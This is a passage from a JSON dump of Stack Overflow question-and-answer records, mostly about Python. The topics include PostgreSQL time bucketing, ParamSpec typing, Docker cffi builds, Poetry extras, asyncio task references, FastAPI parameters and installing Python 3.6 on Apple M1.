    "AcceptedAnswer": "This can be done in plain sql (apart from time_bucket function), in a nested sql query:\nselect \n    interval_start, \n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n    select \n        interval_start,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start) i\n    join trips t\n        on t.start_date <= i.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= interval_start\n    ) subq\ngroup by interval_start\norder by interval_start;\n\nThis gives me the following result:\n   interval_start    | seconds\n---------------------+---------\n 2022-03-10 01:00:00 |     720\n 2022-03-10 02:00:00 |    4200\n 2022-03-10 03:00:00 |    5460\n 2022-03-10 04:00:00 |    3600\n 2022-03-10 05:00:00 |    4680\n 2022-03-10 06:00:00 |       0\n(6 rows)\n\nExplanation\nLet's break the query down.\nIn the innermost query:\nselect generate_series(\n        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n        '1 hour'\n    ) as interval_start\n\nwe generate a series of time interval starts - from minimal start_date value up to the maximal end_time value, truncated to full hours, with 1-hour step. Each boundary can obviously be replaced with an arbitrary datetime. Direct result of this query is the following:\n   interval_start\n---------------------\n 2022-03-10 01:00:00\n 2022-03-10 02:00:00\n 2022-03-10 03:00:00\n 2022-03-10 04:00:00\n 2022-03-10 05:00:00\n 2022-03-10 06:00:00\n(6 rows)\n\nThen, the middle-level query joins this series with the trips table, joining rows if and only if any part of the trip took place during the hour-long interval beginning at the time given by the 'interval_start' column:\nselect interval_start,\n    greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n    least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\nfrom (\n    -- innermost query\n    select generate_series(\n        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n        '1 hour'\n    ) as interval_start\n    -- innermost query end\n) intervals\njoin trips t\n    on t.start_date = intervals.interval_start\n\nThe two computed values represent respectively:\n\nseconds_before_trip_started - number of second passed between the beginning of the interval, and the beginning of the trip (or 0 if the trip begun prior to interval start). This is the time the trip didn't take place - thus we will be substructing it in the following step\nseconds_before_trip_ended - number of seconds passed between the end of the interval, and the end of the trip (or 3600 if the trip didn't end within concerned interval).\n\nThe outermost query substracts the two beformentioned fields, effectively computing the time each trip took in each interval, and sums it for all trips, grouping by interval:\nselect \n    interval_start, \n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n-- middle-level query\n    select \n        interval_start,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start) i\n    join trips t\n        on t.start_date <= i.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= interval_start\n-- middle-level query end\n    ) subq\ngroup by interval_start\norder by interval_start;\n\nAdditional grouping\nIn case we have another column in the table, and what we really need is the segmentation of the above result in respect to that column, we simply need to add it to the appropriate select and group by clauses (optionally to order by clause as well).\nSuppose there's an additional driver_id column in the trips table:\n id | number_of_trip |     start_date      |      end_date       | seconds | driver_id\n----+----------------+---------------------+---------------------+---------+-----------\n  1 | 637hui         | 2022-03-10 01:20:00 | 2022-03-10 01:32:00 |     720 |         0\n  2 | 384nfj         | 2022-03-10 02:18:00 | 2022-03-10 02:42:00 |    1440 |         0\n  3 | 102fiu         | 2022-03-10 02:10:00 | 2022-03-10 02:23:00 |     780 |         1\n  4 | 948pvc         | 2022-03-10 02:40:00 | 2022-03-10 03:20:00 |    2400 |         1\n  5 | 473mds         | 2022-03-10 02:45:00 | 2022-03-10 02:58:00 |     780 |         1\n  6 | 103fkd         | 2022-03-10 03:05:00 | 2022-03-10 03:28:00 |    1380 |         2\n  7 | 905783         | 2022-03-10 03:12:00 |                     |       0 |         2\n  8 | 498wsq         | 2022-03-10 05:30:00 | 2022-03-10 05:48:00 |    1080 |         2\n\nThe modified query would look like that:\nselect\n    interval_start,\n    driver_id,\n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n    select \n        interval_start,\n        driver_id,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start\n    ) intervals\n    join trips t\n        on t.start_date <= intervals.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= intervals.interval_start\n) subq\ngroup by interval_start, driver_id\norder by interval_start, driver_id;\n\nand give the following result:\n   interval_start    | driver_id | seconds\n---------------------+-----------+---------\n 2022-03-10 01:00:00 |         0 |     720\n 2022-03-10 02:00:00 |         0 |    1440\n 2022-03-10 02:00:00 |         1 |    2760\n 2022-03-10 03:00:00 |         1 |    1200\n 2022-03-10 03:00:00 |         2 |    4260\n 2022-03-10 04:00:00 |         2 |    3600\n 2022-03-10 05:00:00 |         2 |    4680\n 2022-03-10 06:00:00 |         2 |       0\n\n"
}
{
    "Id": 71253495,
    "PostTypeId": 1,
    "Title": "How to annotate the type of arguments forwarded to another function?",
    "Body": "Let's say we have a trivial function that calls open() but with a fixed argument:\ndef open_for_writing(*args, **kwargs):\n    kwargs['mode'] = 'w'\n    return open(*args, **kwargs)\n\nIf I now try to call open_for_writing(some_fake_arg = 123), no type checker (e.g. mypy) can tell that this is an incorrect invocation: it's missing the required file argument, and is adding another argument that isn't part of the open signature.\nHow can I tell the type checker that *args and **kwargs must be a subset of the open parameter spec? I realise Python 3.10 has the new ParamSpec type, but it doesn't seem to apply here because you can't get the ParamSpec of a concrete function like open.\n",
    "AcceptedAnswerId": 71262408,
    "AcceptedAnswer": "I think out of the box this is not possible. However, you could write a decorator that takes the function that contains the arguments you want to get checked for (open in your case) as an input and returns the decorated function, i.e. open_for_writing in your case. This of course only works with python 3.10 or using typing_extensions as it makes use of ParamSpec\nfrom typing import TypeVar, ParamSpec, Callable, Optional\n\nT = TypeVar('T')\nP = ParamSpec('P')\n\n\ndef take_annotation_from(this: Callable[P, Optional[T]]) -> Callable[[Callable], Callable[P, Optional[T]]]:\n    def decorator(real_function: Callable) -> Callable[P, Optional[T]]:\n        def new_function(*args: P.args, **kwargs: P.kwargs) -> Optional[T]:\n            return real_function(*args, **kwargs)\n\n        return new_function\n    return decorator\n\n@take_annotation_from(open)\ndef open_for_writing(*args, **kwargs):\n    kwargs['mode'] = 'w'\n    return open(*args, **kwargs)\n\n\nopen_for_writing(some_fake_arg=123)\nopen_for_writing(file='')\n\nAs shown here, mypy complains now about getting an unknown argument.\n"
}
{
    "Id": 71372066,
    "PostTypeId": 1,
    "Title": "Docker fails to install cffi with python:3.9-alpine in Dockerfile",
    "Body": "Im trying to run the below Dockerfile using docker-compose.\nI searched around but I couldnt find a solution on how to install cffi with python:3.9-alpine.\nI also read this post which states that pip 21.2.4 or greater can be a possible solution but it didn't work out form me\nhttps://www.pythonfixing.com/2021/09/fixed-why-i-getting-this-error-while.html\nDocker file\nFROM python:3.9-alpine\n\nENV PYTHONDONTWRITEBYTECODE 1\nENV PYTHONUNBUFFERED 1\n\nCOPY ./requirements.txt .\n\nRUN apk add --update --no-cache postgresql-client\n\nRUN apk add --update --no-cache --virtual .tmp-build-deps \\\n    gcc libc-dev linux-headers postgresql-dev\nRUN pip3 install --upgrade pip && pip3 install -r /requirements.txt\n\nRUN apk del .tmp-build-deps\n\nRUN mkdir /app\nWORKDIR /app\nCOPY . /app\n\nRUN adduser -D user\n\nUSER user\n\nThis is the requirements.txt file.\nasgiref==3.5.0\nbackports.zoneinfo==0.2.1\ncertifi==2021.10.8\ncffi==1.15.0\ncfgv==3.3.1\n...\n\nError message:\nprocess-exited-with-error\n#9 47.99   \n#9 47.99   \u00d7 Running setup.py install for cffi did not run successfully.\n#9 47.99   \u2502 exit code: 1\n#9 47.99   \u2570\u2500> [58 lines of output]\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       Package libffi was not found in the pkg-config search path.\n#9 47.99       Perhaps you should add the directory containing `libffi.pc'\n#9 47.99       to the PKG_CONFIG_PATH environment variable\n#9 47.99       Package 'libffi', required by 'virtual:world', not found\n#9 47.99       running install\n#9 47.99       running build\n#9 47.99       running build_py\n#9 47.99       creating build\n#9 47.99       creating build/lib.linux-aarch64-3.9\n#9 47.99       creating build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/__init__.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/cffi_opcode.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/commontypes.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/vengine_gen.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/vengine_cpy.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/backend_ctypes.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/api.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/ffiplatform.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/verifier.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/error.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/setuptools_ext.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/lock.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/recompiler.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/pkgconfig.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/cparser.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/model.py -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_cffi_include.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/parse_c_type.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_embedding.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       copying cffi/_cffi_errors.h -> build/lib.linux-aarch64-3.9/cffi\n#9 47.99       warning: build_py: byte-compiling is disabled, skipping.\n#9 47.99       \n#9 47.99       running build_ext\n#9 47.99       building '_cffi_backend' extension\n#9 47.99       creating build/temp.linux-aarch64-3.9\n#9 47.99       creating build/temp.linux-aarch64-3.9/c\n#9 47.99       gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -DTHREAD_STACK_SIZE=0x100000 -fPIC -DUSE__THREAD -DHAVE_SYNC_SYNCHRONIZE -I/usr/include/ffi -I/usr/include/libffi -I/usr/local/include/python3.9 -c c/_cffi_backend.c -o build/temp.linux-aarch64-3.9/c/_cffi_backend.o\n#9 47.99       c/_cffi_backend.c:15:10: fatal error: ffi.h: No such file or directory\n#9 47.99          15 | #include \n#9 47.99             |          ^~~~~~~\n#9 47.99       compilation terminated.\n#9 47.99       error: command '/usr/bin/gcc' failed with exit code 1\n#9 47.99       [end of output]\n#9 47.99   \n#9 47.99   note: This error originates from a subprocess, and is likely not a problem with pip.\n#9 47.99 error: legacy-install-failure\n#9 47.99 \n#9 47.99 \u00d7 Encountered error while trying to install package.\n#9 47.99 \u2570\u2500> cffi\n#9 47.99 \n#9 47.99 note: This is an issue with the package mentioned above, not pip.\n#9 47.99 hint: See above for output from the failure.\n\n",
    "AcceptedAnswerId": 71372163,
    "AcceptedAnswer": "@Klaus D.'s comment helped a lot.\nI updated Dockerfile:\nRUN apk add --update --no-cache --virtual .tmp-build-deps \\\n    gcc libc-dev linux-headers postgresql-dev \\\n    && apk add libffi-dev\n\n"
}
{
    "Id": 71386332,
    "PostTypeId": 1,
    "Title": "How do I specify \"extra\" / bracket dependencies in a pyproject.toml?",
    "Body": "I'm working on a project that specifies its dependencies using Poetry and a pyproject.toml file to manage dependencies. The documentation for one of the libraries I need suggests pip-installing with an \"extra\" option to one of the dependencies, like this:\npip install google-cloud-bigquery[opentelemetry]\n\nHow should I reflect this requirement in the pyproject.toml file?  Currently, there are a few lines like this:\n[tool.poetry.dependencies]\npython = \"3.7.10\"\napache-beam = \"2.31.0\"\ndynaconf = \"3.1.4\"\ngoogle-cloud-bigquery = \"2.20.0\"\n\nChanging the last line to\ngoogle-cloud-bigquery[opentelemetry] = \">=2.20.0\"\n\nyields\nInvalid TOML file /home/jupyter/vertex-monitoring/pyproject.toml: Unexpected character: 'o' at line 17 col 22\n\nOther variants that don't seem to be parsed properly:\ngoogle-cloud-bigquery[\"opentelemetry\"] = \"2.20.0\"\n\nThere are other StackOverflow questions which look related, as well as several different PEP docs, but my searches are complicated because I'm not sure whether these are \"options\" or \"extras\" or something else.\n",
    "AcceptedAnswerId": 71387157,
    "AcceptedAnswer": "You can add it by poetry add \"google-cloud-bigquery[opentelemetry]\". This will result in:\n[tool.poetry.dependencies]\n...\ngoogle-cloud-bigquery = {extras = [\"opentelemetry\"], version = \"^2.34.2\"}\n\n"
}
{
    "Id": 71938799,
    "PostTypeId": 1,
    "Title": "Python asyncio.create_task() - really need to keep a reference?",
    "Body": "The documentation of asyncio.create_task() states the following warning:\n\nImportant: Save a reference to the result of this function, to avoid a task disappearing mid execution. (source)\n\nMy question is: Is this really true?\nI have several IO bound \"fire and forget\" tasks which I want to run concurrently using asyncio by submitting them to the event loop using asyncio.create_task(). However, I do not really care for the return value of the coroutine or even if they run successfully, only that they do run eventually. One use case is writing data from an \"expensive\" calculation back to a Redis data base. If Redis is available, great. If not, oh well, no harm. This is why I do not want/need to await those tasks.\nHere a generic example:\nimport asyncio\n\nasync def fire_and_forget_coro():\n    \"\"\"Some random coroutine waiting for IO to complete.\"\"\"\n    print('in fire_and_forget_coro()')\n    await asyncio.sleep(1.0)\n    print('fire_and_forget_coro() done')\n\n\nasync def async_main():\n    \"\"\"Main entry point of asyncio application.\"\"\"\n    print('in async_main()')\n    n = 3\n    for _ in range(n):\n        # create_task() does not block, returns immediately.\n        # Note: We do NOT save a reference to the submitted task here!\n        asyncio.create_task(fire_and_forget_coro(), name='fire_and_forget_coro')\n\n    print('awaiting sleep in async_main()')\n    await asycnio.sleep(2.0) # <-- note this line\n    print('sleeping done in async_main()')\n\n    print('async_main() done.')\n\n    # all references of tasks we *might* have go out of scope when returning from this coroutine!\n    return\n\nif __name__ == '__main__':\n    asyncio.run(async_main())\n\nOutput:\nin async_main()\nawaiting sleep in async_main()\nin fire_and_forget_coro()\nin fire_and_forget_coro()\nin fire_and_forget_coro()\nfire_and_forget_coro() done\nfire_and_forget_coro() done\nfire_and_forget_coro() done\nsleeping done in async_main()\nasync_main() done.\n\nWhen commenting out the await asyncio.sleep() line, we never see fire_and_forget_coro() finish. This is to be expected: When the event loop started with asyncio.run() closes, tasks will not be excecuted anymore. But it appears that as long as the event loop is still running, all tasks will be taken care of, even when I never explicitly created references to them. This seem logical to me, as the event loop itself must have a reference to all scheduled tasks in order to run them. And we can even get them all using asyncio.all_tasks()!\nSo, I think I can trust Python to have at least one strong reference to every scheduled tasks as long as the event loop it was submitted to is still running, and thus I do not have to manage references myself. But I would like a second opinion here. Am I right or are there pitfalls I have not yet recognized?\nIf I am right, why the explicit warning in the documentation? It is a usual Python thing that stuff is garbage-collected if you do not keep a reference to it. Are there situations where one does not have a running event loop but still some task objects to reference? Maybe when creating an event loop manually (never did this)?\n",
    "AcceptedAnswerId": 71956673,
    "AcceptedAnswer": "There is an open issue at the cpython bug tracker at github about this topic I just found:\nhttps://github.com/python/cpython/issues/88831\nQuote:\n\nasyncio will only keep weak references to alive tasks (in _all_tasks). If a user does not keep a reference to a task and the task is not currently executing or sleeping, the user may get \"Task was destroyed but it is pending!\".\n\nSo the answer to my question is, unfortunately, yes. One has to keep around a reference to the scheduled task.\nHowever, the github issue also describes a relatively simple workaround: Keep all running tasks in a set() and add a callback to the task which removes itself from the set() again.\nrunning_tasks = set()\n# [...]\ntask = asyncio.create_task(some_background_function())\nrunning_tasks.add(task)\ntask.add_done_callback(lambda t: running_tasks.remove(t))\n\n"
}
{
    "Id": 71380024,
    "PostTypeId": 1,
    "Title": "Coverage.py Vs pytest-cov",
    "Body": "The documentation of coverage.py says that Many people choose to use the pytest-cov plugin, but for most purposes, it is unnecessary. So I would like to know what is the difference between these two? And which one is the most efficient ?\nThank you in advance\n",
    "AcceptedAnswerId": 71388807,
    "AcceptedAnswer": "pytest-cov uses coverage.py, so there's no different in efficiency, or basic behavior.  pytest-cov auto-configures multiprocessing settings, and ferries data around if you use pytest-xdist.\n"
}
{
    "Id": 71268169,
    "PostTypeId": 1,
    "Title": "Optional query parameters in FastAPI",
    "Body": "I don't understand optional query parameters in FastAPI. How is it different from default query parameters with a default value of None?\nWhat is the difference between arg1 and arg2 in the example below where arg2 is made an optional query parameter as described in the above link?\n@app.get(\"/info/\")\nasync def info(arg1: int = None, arg2: int | None = None):\n    return {\"arg1\": arg1, \"arg2\": arg2}\n\n",
    "AcceptedAnswerId": 71272615,
    "AcceptedAnswer": "This is covered in the reference manual, albeit just as a small note:\nasync def read_items(q: Optional[str] = None):\n\n\nFastAPI will know that the value of q is not required because of the default value = None.\nThe Optional in Optional[str] is not used by FastAPI, but will allow your editor to give you better support and detect errors.\n\n(Optional[str] is the same as str | None pre 3.10 for other readers)\nSince your editor might not be aware of the context in which the parameter is populated and used by FastAPI, it might have trouble understanding the actual signature of the function when the parameter is not marked as Optional. You may or may not care about this distinction.\n"
}
{
    "Id": 71862398,
    "PostTypeId": 1,
    "Title": "Install python 3.6.* on Mac M1",
    "Body": "I'm trying to run an old app that requires python \nI've installed pyenv-virtualenv and pyenv and successfully installed python 3.7.13. However, when I try to install 3.6.*, I get this:\n$ pyenv install 3.6.13\npython-build: use openssl@1.1 from homebrew\npython-build: use readline from homebrew\nDownloading Python-3.6.13.tar.xz...\n-> https://www.python.org/ftp/python/3.6.13/Python-3.6.13.tar.xz\nInstalling Python-3.6.13...\npython-build: use tcl-tk from homebrew\npython-build: use readline from homebrew\npython-build: use zlib from xcode sdk\n\nBUILD FAILED (OS X 12.3.1 using python-build 2.2.5-11-gf0f2cdd1)\n\nInspect or clean up the working tree at /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773\nResults logged to /var/folders/r5/xz73mp557w30h289rr6trb800000gp/T/python-build.20220413143259.33773.log\n\nLast 10 log lines:\nchecking for --with-cxx-main=... no\nchecking for clang++... no\nconfigure:\n\n  By default, distutils will build C++ extension modules with \"clang++\".\n  If this is not intended, then set CXX on the configure command line.\n  \nchecking for the platform triplet based on compiler characteristics... darwin\nconfigure: error: internal configure error for the platform triplet, please file a bug report\nmake: *** No targets specified and no makefile found.  Stop.\n\nIs there a way to solve this? I've looked and it seems like Mac M1 doesn't allow installing 3.6.*\n",
    "AcceptedAnswerId": 71957981,
    "AcceptedAnswer": "Copying from a GitHub issue.\n\nI successfully installed Python 3.6 on an Apple M1 MacBook Pro running Monterey using the following setup. There is probably some things in here that can be removed/refined... but it worked for me!\n#Install Rosetta\n/usr/sbin/softwareupdate --install-rosetta --agree-to-license\n\n# Install x86_64 brew\narch -x86_64 /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n\n# Set up x86_64 homebrew and pyenv and temporarily set aliases\nalias brew86=\"arch -x86_64 /usr/local/bin/brew\"\nalias pyenv86=\"arch -x86_64 pyenv\"\n\n# Install required packages and flags for building this particular python version through emulation\nbrew86 install pyenv gcc libffi gettext\nexport CPPFLAGS=\"-I$(brew86 --prefix libffi)/include -I$(brew86 --prefix openssl)/include -I$(brew86 --prefix readline)/lib\"\nexport CFLAGS=\"-I$(brew86 --prefix openssl)/include -I$(brew86 --prefix bzip2)/include -I$(brew86 --prefix readline)/include -I$(xcrun --show-sdk-path)/usr/include -Wno-implicit-function-declaration\" \nexport LDFLAGS=\"-L$(brew86 --prefix openssl)/lib -L$(brew86 --prefix readline)/lib -L$(brew86 --prefix zlib)/lib -L$(brew86 --prefix bzip2)/lib -L$(brew86 --prefix gettext)/lib -L$(brew86 --prefix libffi)/lib\"\n\n# Providing an incorrect openssl version forces a proper openssl version to be downloaded and linked during the build\nexport PYTHON_BUILD_HOMEBREW_OPENSSL_FORMULA=openssl@1.0\n\n# Install Python 3.6\npyenv86 install --patch 3.6.15 <<(curl -sSL https://raw.githubusercontent.com/pyenv/pyenv/master/plugins/python-build/share/python-build/patches/3.6.15/Python-3.6.15/0008-bpo-45405-Prevent-internal-configure-error-when-runn.patch\\?full_index\\=1)\n\nNote, the build succeeds but gives the following warning\nWARNING: The Python readline extension was not compiled. Missing the GNU readline lib?\n\nrunning pyenv versions shows that 3.6.15 can be used normally by the system\n"
}
{
    "Id": 71410741,
    "PostTypeId": 1,
    "Title": "pip uninstall GDAL gives AttributeError: 'PathMetadata' object has no attribute 'isdir'",
    "Body": "I'm trying to pip install geopandas as a fresh installation, so I want to remove existing packages like GDAL and fiona. I've already managed to pip uninstall fiona, but when I try to uninstall or reinstall GDAL it gives the following error message:\n(base) C:\\usr>pip install C:/usr/Anaconda3/Lib/site-packages/GDAL-3.4.1-cp38-cp38-win_amd64.whl\nProcessing c:\\usr\\anaconda3\\lib\\site-packages\\gdal-3.4.1-cp38-cp38-win_amd64.whl\nInstalling collected packages: GDAL\n  Attempting uninstall: GDAL\n    Found existing installation: GDAL 3.0.2\nERROR: Exception:\nTraceback (most recent call last):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\cli\\base_command.py\", line 167, in exc_logging_wrapper\n    status = run_func(*args)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\cli\\req_command.py\", line 205, in wrapper\n    return func(self, options, args)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\commands\\install.py\", line 405, in run\n    installed = install_given_reqs(\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\__init__.py\", line 68, in install_given_reqs\n    uninstalled_pathset = requirement.uninstall(auto_confirm=True)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\req_install.py\", line 637, in uninstall\n    uninstalled_pathset = UninstallPathSet.from_dist(dist)\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\req\\req_uninstall.py\", line 554, in from_dist\n    for script in dist.iterdir(\"scripts\"):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_internal\\metadata\\pkg_resources.py\", line 156, in iterdir\n    if not self._dist.isdir(name):\n  File \"C:\\usr\\Anaconda3\\lib\\site-packages\\pip\\_vendor\\pkg_resources\\__init__.py\", line 2816, in __getattr__\n    return getattr(self._provider, attr)\nAttributeError: 'PathMetadata' object has no attribute 'isdir'\n\nDoes anyone know why GDAL cannot be uninstalled?\n",
    "AcceptedAnswerId": 71417752,
    "AcceptedAnswer": "I just came across this question after getting the same error.  Coincidentally I had just upgraded pip (I was getting tired of the yellow warnings).\nAll I had was to down grade my pip\npip install pip==21.3.1 --user\n\n"
}
{
    "Id": 71391946,
    "PostTypeId": 1,
    "Title": "Does Raku has Python's Union type?",
    "Body": "In Python, Python has Union type, which is convenient when a method can accept multi types:\nfrom typing import Union\n\ndef test(x: Union[str,int,float,]):\n    print(x)\n\nif __name__ == '__main__':\n    test(1)\n    test('str')\n    test(3.1415926)\n\nRaku probably doesn't have Union type as Python, but a where clause can achieve a similar effect:\nsub test(\\x where * ~~ Int | Str | Rat) {\n    say(x)\n}\n\nsub MAIN() {\n    test(1);\n    test('str');\n    test(3.1415926);\n}\n\nI wander if Raku have a possibility to provide the Union type as Python?\n#        vvvvvvvvvvvvvvvvvvvv - the Union type doesn't exist in Raku now.\nsub test(Union[Int, Str, Rat] \\x) {\n    say(x)\n}\n\n",
    "AcceptedAnswerId": 71402432,
    "AcceptedAnswer": "My answer (which is very similar to your first solution ;) would be:\nsubset Union where Int | Rat | Str;\n\nsub test(Union \\x) {\n   say(x) \n}\n\nsub MAIN() {\n    test(1);\n    test('str');\n    test(pi);\n}\n\nConstraint type check failed in binding to parameter 'x'; \nexpected Union but got Num (3.141592653589793e0)\n\n(or you can put a where clause in the call signature, as you have it)\nIn contrast to Python:\n\nthis is native in raku and does not rely on a package like \"typing\" to be imported\nPython Union / SumTypes are used for static hinting, which is good for eg. IDEs\nbut these types are unenforced in Python (per @freshpaste comment and this SO), in raku they are checked and will fail at runtime\n\nSo - the raku syntax is there to do what you ask ... sure, it's a different language so it does it in a different way.\nPersonally I think that a typed language should fail if type checks are breached. It seems to me that type hinting that is not always enforced is a false comfort blanket.\nOn a wider point, raku also offers built in Allomorph types for IntStr, RatStr, NumStr and ComplexStr - so you can work in a mixed mode using both string and math functions\n"
}
{
    "Id": 71470236,
    "PostTypeId": 1,
    "Title": "POST request response 422 error {'detail': [{'loc': ['body'], 'msg': 'value is not a valid dict', 'type': 'type_error.dict'}]}",
    "Body": "My POST request continues to fail with 422 response, even though valid JSON is being sent. I am trying to create a web app that receives an uploaded text file with various genetic markers and sends it to the tensorflow model to make a cancer survival prediction. The link to the github project can be found here.\nHere is the POST request:\n df_json = dataframe.to_json(orient='records')\n prediction = requests.post('http://backend:8080/prediction/', json=json.loads(df_json), headers={\"Content-Type\": \"application/json\"})\n\nAnd here is the pydantic model along with the API endpoint:\nclass Userdata(BaseModel):\nRPPA_HSPA1A : float\nRPPA_XIAP : float\nRPPA_CASP7 : float\nRPPA_ERBB3 :float\nRPPA_SMAD1 : float\nRPPA_SYK : float\nRPPA_STAT5A : float\nRPPA_CD20 : float\nRPPA_AKT1_Akt :float\nRPPA_BAD : float\nRPPA_PARP1 : float\nRPPA_MSH2 : float\nRPPA_MSH6 : float\nRPPA_ACACA : float\nRPPA_COL6A1 : float\nRPPA_PTCH1 : float\nRPPA_AKT1 : float\nRPPA_CDKN1B : float\nRPPA_GATA3 : float\nRPPA_MAPT : float\nRPPA_TGM2 : float\nRPPA_CCNE1 : float\nRPPA_INPP4B : float\nRPPA_ACACA_ACC1 : float\nRPPA_RPS6 : float\nRPPA_VASP : float\nRPPA_CDH1 : float\nRPPA_EIF4EBP1 : float\nRPPA_CTNNB1 : float\nRPPA_XBP1 : float\nRPPA_EIF4EBP1_4E : float\nRPPA_PCNA : float\nRPPA_SRC : float\nRPPA_TP53BP1 : float\nRPPA_MAP2K1 : float\nRPPA_RAF1 : float\nRPPA_MET : float\nRPPA_TP53 : float\nRPPA_YAP1 : float\nRPPA_MAPK8 : float\nRPPA_CDKN1B_p27 : float\nRPPA_FRAP1 : float\nRPPA_RAD50 : float\nRPPA_CCNE2 : float\nRPPA_SNAI2 : float\nRPPA_PRKCA_PKC : float\nRPPA_PGR : float\nRPPA_ASNS : float\nRPPA_BID : float\nRPPA_CHEK2 : float\nRPPA_BCL2L1 : float\nRPPA_RPS6 : float\nRPPA_EGFR : float\nRPPA_PIK3CA : float\nRPPA_BCL2L11 : float\nRPPA_GSK3A : float\nRPPA_DVL3 : float\nRPPA_CCND1 : float\nRPPA_RAB11A : float\nRPPA_SRC_Src_pY416 :float\nRPPA_BCL2L111 : float\nRPPA_ATM : float\nRPPA_NOTCH1 : float\nRPPA_C12ORF5 : float\nRPPA_MAPK9 : float\nRPPA_FN1 : float\nRPPA_GSK3A_GSK3B : float\nRPPA_CDKN1B_p27_pT198 : 